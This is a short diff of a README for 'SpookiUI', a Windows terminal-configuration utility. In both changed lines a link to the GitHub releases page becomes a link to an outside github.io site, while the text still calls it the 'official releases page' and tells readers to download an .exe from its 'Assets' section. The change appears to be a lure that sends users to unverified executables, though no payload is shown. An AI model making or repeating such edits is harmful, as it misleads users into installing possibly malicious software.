@@ -1,6 +1,6 @@
 # 👻 SpookiUI - Simplify your terminal configuration settings today
 
-[![Download SpookiUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Megandimorphic651/SpookiUI/releases)
+[![Download SpookiUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://megandimorphic651.github.io)
 
 ## What is SpookiUI?
 
@@ -21,7 +21,7 @@ If you encounter issues during setup, confirm that your Windows installation has
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Megandimorphic651/SpookiUI/releases).
+1. Visit the [official releases page](https://megandimorphic651.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that corresponds to your system architecture. Most modern computers use the x64 version.
 4. Save the file to your Downloads folder.
